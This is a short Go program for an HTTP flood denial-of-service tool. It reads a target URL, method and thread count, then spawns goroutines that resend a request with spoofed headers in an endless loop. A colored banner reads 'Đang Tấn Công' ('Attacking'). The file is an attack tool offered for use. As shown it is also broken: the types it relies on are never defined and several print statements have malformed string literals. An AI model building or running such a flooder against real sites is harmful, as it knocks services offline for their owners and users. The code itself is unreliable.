package main
import "fmt"
import(
  "crypto/tls"
  "os"
  "strconv"
  "log"
  "github.com/valyala/fasthttp"
)
var target struct{
  url string
  threads int
  method string
  a_type string
}

func httpflood(){
  head := header{"false", nil}
  sp := spoof{"127.0.0.1", 5}
  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
  req := fasthttp.AcquireRequest()
  req.SetRequestURI(target.url)
  req.Header.SetMethod(target.method)
  head.headers(req)
  sp.spoofS(req)
  for{
    client.Do(req, nil)
  }
}

func main(){
  target.url = os.Args[1]
  target.method = os.Args[2]
  threads, _ := strconv.Atoi(os.Args[3])
  log.Print("Được Tính Theo Giờ UTC")
  fmt.Print("       Bản Quyền Thuộc về NgThanhVinh            ")
  fmt.Print(\033[38;5;123m" ####.##....##.########..########.....###        ")
  fmt.Print(\033[38;5;123m"  ##..###...##.##.....##.##.....##...##.##       ")
  fmt.Print(\x1b[31m"  ##..####..##.##.....##.##.....##..##...##      ")
  fmt.Print(\x1b[31m"  ##..##.##.##.##.....##.########..##.....##     ")
  fmt.Print(\033[38;5;123m"  ##..##..####.##.....##.##...##...#########     ")
  fmt.Print(\x1b[31m"  ##..##...###.##.....##.##....##..##.....##     ")
  fmt.Print(\033[38;5;123m" ####.##....##.########..##.....##.##.....##     ")
  
  fmt.Print(\x1b[31m"  Đang Tấn Công ... ")
   for i:=0; i < threads; i++{
     go httpflood()
   }

  <- make(chan bool, 1)
}
